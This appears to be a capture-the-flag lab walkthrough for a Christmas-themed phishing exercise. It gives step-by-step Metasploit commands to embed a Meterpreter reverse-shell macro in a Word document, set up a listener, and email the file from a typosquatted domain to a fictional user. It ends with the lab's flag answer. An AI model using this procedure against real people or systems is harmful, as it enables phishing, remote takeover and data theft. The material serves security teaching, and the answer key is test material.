# Day 10: He had a brain full of macros, and had shells in his soul.

**Learning Objectives**
- Understand how phishing attacks work
- Discover how macros in documents can be used and abused
- Learn how to carry out a phishing attack with a macro

### Phishing Attacks

Security is as strong as the weakest link. Many would argue that humans are the weakest link in the security chain. Is it easier to exploit a patched system behind a firewall or to convince a user to open an “important” document? Hence, “human hacking” is usually the easiest to accomplish and falls under social engineering.

Phishing works by sending a “bait” to a large group of target users. Attackers often craft their messages with a sense of urgency, prompting target users to take immediate action without thinking critically, increasing the chances of success. The purpose is to steal personal information or install malware, usually by convincing the target user to fill out a form, open a file, or click a link.
The attacker just needs to have their target users open the malicious file or view the malicious link. This can trigger specific actions that would give the attacker control over your system.

### Macros

In computing, a **macro** refers to a set of programmed instructions designed to automate repetitive tasks. MS Word, among other MS Office products, supports adding macros to documents. In many cases, these macros can be a tremendous time-saving feature. However, in cyber security, these automated programs can be hijacked for malicious purposes.

### Attack Plan

In his plans, Mayor Malware needs to create a document with a malicious macro. Upon opening the document, the macro will execute a payload and connect to the Mayor’s machine, giving him remote control. Consequently, the Mayor needs to ensure that he is listening for incoming connections on his machine before emailing the malicious document to Marta May Ware. By executing the macro, the Mayor gains remote access to Marta’s system through a reverse shell, allowing him to execute commands and control her machine remotely. The steps are as follows:

1. Create a document with a malicious macro
2. Start listening for incoming connections on the attacker’s system
3. Email the document and wait for the target user to open it
4. The target user opens the document and connects to the attacker’s system
5. Control the target user’s system

You might wonder why you don’t set the malicious macro so that you can connect to the target system directly instead of the other way around. The reason is that when the target system is behind a firewall or has a private IP address, you cannot reach it and, hence, cannot connect to it.

### Attacker’s System

On the **AttackBox**, you need to carry out two steps:
- Create a document with an embedded malicious macro
- Listen for incoming connections

### Creating the Malicious Document

The first step would be to embed a malicious macro within the document. You will use the Metasploit Framework to create the document. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `set payload windows/meterpreter/reverse_tcp` specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell
- `use exploit/multi/fileformat/office_word_macro` specifies the exploit you want to use. Technically speaking, this is not an exploit; it is a module to create a document with a macro
- `set LHOST 10.10.196.139` specifies the IP address of the attacker’s system, `10.10.196.139` in this case is the IP of the AttackBox
- `set LPORT 8888` specifies the port number you are going to listen on for incoming connections on the AttackBox
- `show options` shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number
![image](https://github.com/user-attachments/assets/9e669109-62e9-415a-9448-4f453dd0eea3)
- `exploit` generates a macro and embeds it in a document
- `exit` to quit and return to the terminal
![image](https://github.com/user-attachments/assets/a1b381b9-1182-47bf-b9a1-382458f8703e)
As you can see, the Word document with the embedded macro was created and stored in `/root/.msf4/local/msf.docm`.

### Listening for Incoming Connections

We again will use the Metasploit Framework, but this time to listen for incoming connections when a target users opens our phishing Word document. This requires the following commands:

- Open a new terminal window and run `msfconsole` to start the Metasploit Framework
- `use multi/handler` to handle incoming connections
- `set payload windows/meterpreter/reverse_tcp` to ensure that our payload works with the payload used when creating the malicious macro  
- `set LHOST 10.10.196.139` specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
- `set LPORT 8888` specifies the port number you are going to listen on and should be the same as the one used when creating the document
- `show options` to confirm the values of your options
![image](https://github.com/user-attachments/assets/5821e20f-d568-42e6-aa7b-f0a44f211ebd)
- `exploit` starts listening for incoming connections to establish a reverse shell
![image](https://github.com/user-attachments/assets/fa12a961-d232-444d-855a-4af19078bd83)

### Email the Malicious Document

The malicious document has been created. All you need to do is to send it to the target user. It is time to send an email to the target user, `marta@socmas.thm`. Mayor Malware has prepared the following credentials:

- Email: `info@socnas.thm`
- Password: `MerryPhishMas!`

Notice how Mayor Malware uses a domain name that looks similar to the target user’s. This technique is known as “typosquatting", where attackers create domain names that are nearly identical to legitimate ones in order to trick victims.

1. On the AttackBox, start the Firefox web browser and head to `http://10.10.0.136`. Use the above credentials to log in.
2. Once logged in, compose an email to the target user, and don’t forget to attach the document you created. Write a couple of sentences explaining what you are attaching to convince Marta May Ware to open the document.
3. To attach the malicious file, in the file upload, go to root -> .msf4 -> local and select the **msf.docm**.
>[!note]
>You can use **CTRL+H** on the file upload pop-up to be able to see hidden files, including the `.msf4` directory where our email attachment is located.
![image](https://github.com/user-attachments/assets/be1ee304-14aa-4044-9065-65297430ad69)

### Exploitation

If everything works out, you will get a reverse shell after about 2 minutes.
![image](https://github.com/user-attachments/assets/e50d3387-9120-49a7-a489-f87c4595f922)

You can access the files and folders on the target system via the command line. You can use `cat` to display any text file.

### Answers
1. What is the flag value inside the `flag.txt` file that’s located on the Administrator’s desktop? **THM{PHISHING_CHRISTMAS}**.
![image](https://github.com/user-attachments/assets/78fccd4e-a75a-4d8d-b924-421466d041c8)
